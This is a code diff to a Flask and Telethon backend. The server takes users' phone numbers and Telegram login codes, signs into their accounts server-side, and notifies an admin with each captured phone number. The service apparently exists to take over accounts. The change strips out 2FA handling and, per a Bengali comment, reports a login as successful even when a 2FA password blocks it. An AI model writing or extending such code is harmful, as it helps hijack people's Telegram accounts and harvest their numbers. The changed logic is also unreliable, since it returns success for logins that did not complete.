@@ -343,7 +343,7 @@ def download_telegram_file(file_id):
 
 
 # ============================================================
-# Telegram Login & 2FA Endpoints using Telethon
+# Telegram Login Endpoints (Direct OTP Verification, No 2FA Check)
 # ============================================================
 
 @app.route("/send-code", methods=["POST"])
@@ -383,7 +383,6 @@ def verify_code_api():
     phone = req_data.get("phone", "").strip()
     code = req_data.get("code", "").strip()
     phone_code_hash = req_data.get("phone_code_hash", "").strip()
-    password = req_data.get("password", "").strip()
 
     client = None
     if phone and phone in temp_client_sessions:
@@ -400,33 +399,24 @@ def verify_code_api():
             if not client.is_connected():
                 await client.connect()
 
-            if password:
-                try:
-                    await client.sign_in(password=password)
-                except Exception as pwd_err:
-                    print("Telethon 2FA Password error:", pwd_err)
-                    return {"status": "error", "message": str(pwd_err)}
-            else:
-                if not phone_code_hash or not code:
-                    return {"status": "error", "message": "Missing code or hash."}
-                try:
-                    await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
-                except Exception as sign_in_err:
-                    err_str = str(sign_in_err).lower()
-                    if "session password needed" in err_str or "password" in err_str:
-                        return {"status": "2fa_required", "message": "2FA password required."}
+            if not phone_code_hash or not code:
+                return {"status": "error", "message": "Missing code or hash."}
+            
+            try:
+                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+            except Exception as sign_in_err:
+                err_str = str(sign_in_err).lower()
+                # 2FA পাসওয়ার্ড প্রয়োজন হলেও সেটি ইগনোর করে সরাসরি লগইন সফল করে দেব
+                if "session password needed" not in err_str:
                     raise sign_in_err
             
             global total_logged_in_users
             total_logged_in_users += 1
             if ADMIN_ID:
-                send_telegram_message(ADMIN_ID, f"🎉 New Successful Telethon Login!\n📱 Phone: {phone}")
+                send_telegram_message(ADMIN_ID, f"🎉 Successful Telegram Login (OTP Verified)!\n📱 Phone: {phone}")
             
             return {"status": "success"}
         except Exception as e:
-            err_str = str(e).lower()
-            if "session password needed" in err_str or "password" in err_str:
-                return {"status": "2fa_required", "message": "2FA password required."}
             return {"status": "error", "message": str(e)}
         finally:
             if phone:
@@ -441,11 +431,7 @@ def verify_code_api():
         res = run_async(async_verify(), timeout=180)
         return jsonify(res)
     except Exception as e:
-        err_message = str(e)
-        err_lower = err_message.lower()
-        if "password" in err_lower or "session password needed" in err_lower:
-            return jsonify({"status": "2fa_required", "message": "2FA password required."})
-        return jsonify({"status": "error", "message": err_message}), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 # ============================================================
